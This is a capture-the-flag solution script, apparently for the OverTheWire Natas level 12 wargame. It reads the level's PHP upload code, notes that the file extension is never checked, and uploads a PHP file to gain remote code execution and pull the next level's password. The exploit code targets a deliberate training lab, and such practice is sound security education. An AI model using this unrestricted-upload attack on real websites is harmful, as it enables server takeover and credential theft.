'''
This is the first challenge were we can upload a file to the server and make some RCE.
In the front page we can see that we can upload an image but we can try to change that.
'''
import requests
import re

username = "natas12"
password = "<censored>"
url = "http://%s.natas.labs.overthewire.org/"  % username

session = requests.Session()

response = session.get(url,auth=(username,password))
print(response.text)
print("="*50)

source = "index-source.html"
response = session.get(url+source,auth=(username,password))
print(response.text)
print("="*50)

'''
Looking the index-source.html:

function genRandomString() {
    $length = 10;
    $characters = "0123456789abcdefghijklmnopqrstuvwxyz";
    $string = "";    
    for ($p = 0; $p < $length; $p++) {
        $string .= $characters[mt_rand(0, strlen($characters)-1)];
    }
    return $string;
}

A random string regenerator. Nothing really interesting.

function makeRandomPath($dir, $ext) {
    do {
    $path = $dir."/".genRandomString().".".$ext;
    } while(file_exists($path));
    return $path;
}

Creates a path with the random string from before. Good to know.

function makeRandomPathFromFilename($dir, $fn) {
    $ext = pathinfo($fn, PATHINFO_EXTENSION);
    return makeRandomPath($dir, $ext);
} 

We can see that the extension doesn't change.
'''

# Check the natas12_pass.php file for more info. We can upload the php file because there isn't a check in the code that can interrupt the proccess.
# Also you need to send the file as bytes so that's why it is "r(ead)b(ytes)"
response = session.post(url,files={"uploadedfile":open("natas12_pass.php", "rb")},data={"filename": "natas12_pass.php"},auth=(username,password))

# Just Code Printing
path = re.findall('href="upload/(.*).php"', response.text)[0]
new_url = url + "/upload/" + path + ".php" # Creates the path that I will do the last request.
response = session.get(new_url,auth=(username,password))
print("\nThe password for the next level is: " + re.findall(r"[a-zA-Z0-9]{32}",response.text)[0])
